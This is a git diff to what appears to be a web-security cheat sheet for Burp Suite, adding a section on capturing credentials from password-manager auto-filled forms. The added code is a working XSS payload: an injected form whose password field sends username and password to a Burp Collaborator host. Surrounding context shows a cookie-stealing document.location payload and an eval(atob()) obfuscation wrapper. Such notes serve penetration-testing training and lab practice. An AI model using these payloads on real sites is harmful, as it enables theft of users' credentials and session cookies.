@@ -4,6 +4,7 @@
 * [Useful Burp extensions](#useful-burp-extensions-some-of-them-requires-burpsuite-pro)
 * [Cross-Site Scripting Section](#cross-site-scripting-section)
    * [Bypass restrictions method 1](#bypass-restrictions-method-1)
+   * [Capture credentials from auto-filled forms](#capture-credentials-from-auto-filled-forms)
 * [Exploit Server Section](#exploit-server-section)
   * [Send exploit to victim (Reflected XSS in search bar)](#send-exploit-to-victim-reflected-xss-in-search-bar)
 * [SQL Injection Section](#sql-injection-section)
@@ -35,6 +36,17 @@ echo -n "document.location = 'http://<BURP-COLLABORATOR.NET>/?cookie='+document.
 ```javascript
 eval(atob("BASE64-PAYLOAD"))
 <script>eval(atob("BASE64-PAYLOAD"))</script>
+```
+
+### Capture credentials from auto-filled forms
+Sometimes we use password managers that fill in forms automatically and with this technique we can grab those credentials just making a small html form.
+```javascript
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://zy1cmwt0q8o3vtlolrhvx9nfn6t7hw.burpcollaborator.net',{
+  method:'POST',
+  mode: 'no-cors',
+  body:username.value+':'+this.value
+});">
 ```
 
 ## Exploit Server Section
